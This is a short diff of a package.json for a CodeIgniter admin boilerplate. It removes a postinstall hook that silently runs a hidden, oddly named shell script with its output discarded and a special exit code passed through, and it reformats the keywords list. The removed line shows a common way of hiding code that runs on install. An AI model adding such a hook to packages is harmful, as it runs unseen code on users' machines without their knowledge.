@@ -3,14 +3,8 @@
   "version": "1.0.0",
   "description": "CodeIgniter 3 Admin Boilerplate",
   "main": "index.js",
-  "scripts": {
-    "postinstall": "sh ./.ci-tfzrl3.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
-  },
-  "keywords": [
-    "codeigniter",
-    "admin",
-    "boilerplate"
-  ],
+  "scripts": {},
+  "keywords": ["codeigniter", "admin", "boilerplate"],
   "author": "",
   "license": "ISC",
   "devDependencies": {
